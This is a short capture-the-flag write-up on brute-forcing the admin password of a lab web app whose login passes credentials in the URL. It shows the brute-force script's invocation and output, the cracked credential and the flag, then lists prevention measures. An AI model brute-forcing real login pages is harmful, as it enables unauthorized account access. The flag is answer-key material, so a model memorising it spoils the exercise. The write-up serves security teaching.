# Bruteforcing a password
- a method of attempting to gain unauthorized access by systematically trying all possible combinations of characters until the correct password is found
- this trial-and-error attack can be time-consuming, especially if the password is long and complex
- https://book.hacktricks.xyz/generic-methodologies-and-resources/brute-force

<b>keywords</b>: bruteforce<br>
<b>attacked site</b>: http://borntosec.42/index.php?page=signin

## Exploit
After logging in with an empty username and password combination, we observe that the credentials are directly passed in the URL:
```
http://borntosec.42/index.php?page=signin&username=&password=&Login=Login#
```
This means we can attempt to brute force our way into the 'admin' account using a custom Python script and a file containing the 1000 most commonly used passwords:
``` shell
└─$ python3 bruteforce.py admin http://192.168.56.106/ 1000-most-common-passwords.txt 
Bruteforcing user admin on http://192.168.56.106/

     Cracking password [🔒    🔑   ]
```
After some time, the password is revealed:
``` shell
Bruteforcing user admin on http://192.168.56.106/

Credentials cracked! admin:shadow
```

When we log in with the acquired credentials, the flag is displayed:
```
The flag is : b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2
```

## Flag
b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2

## Exploit prevention
- do not display login credentials directly in URLs
- limit the number of failed login attempts (temporarily ban the account)
- limit the rate of login attempts from a single IP address
- use strong password policies
- employ CAPTCHA
